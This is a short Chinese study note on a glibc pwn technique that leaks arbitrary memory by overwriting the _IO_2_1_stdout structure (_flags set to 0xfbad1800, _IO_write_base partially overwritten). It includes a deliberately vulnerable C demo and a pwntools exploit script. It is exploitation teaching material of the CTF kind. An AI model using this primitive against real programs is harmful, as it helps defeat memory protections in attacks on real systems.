# 通过_IO_2_1_stdout泄露任意地址.md

## 过程

1. 设置_flags = 0xFBAD1800
2. 设置_IO_write_base指向想要泄露的位置
3. 设置_IO_write_ptr指向泄露结束的地址

当然，我们通常直接覆盖`_IO_2_1_stdout`为 `p64(0xfbad1800) + p64(0) * 3 + b'\x00\x00'`

## demo

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    setbuf(stdin, NULL);

    char *libc_base = ((char *)&puts) - 0x80e50;
    char *IO_2_1_stdout = libc_base + 0x21b780;

    printf("%p", libc_base);

    read(0, IO_2_1_stdout, 4);        // _flags
    read(0, IO_2_1_stdout + 0x20, 8); // _IO_write_base
    // read(0, IO_2_1_stdout+0x28, 8); // _IO_write_ptr

    printf("HelloWorld!\n");
    printf("HelloWorld!\n");
    printf("HelloWorld!\n");

    return 0;
}
```

```python
from demo import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./demo')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc.address = int(p.recv(14), 16)

p.send(p32(0xfbad1800)) # 设置flag
p.send(b'\x00\x00')     # 设置_IO_write_base的低两字节

p.interactive()
```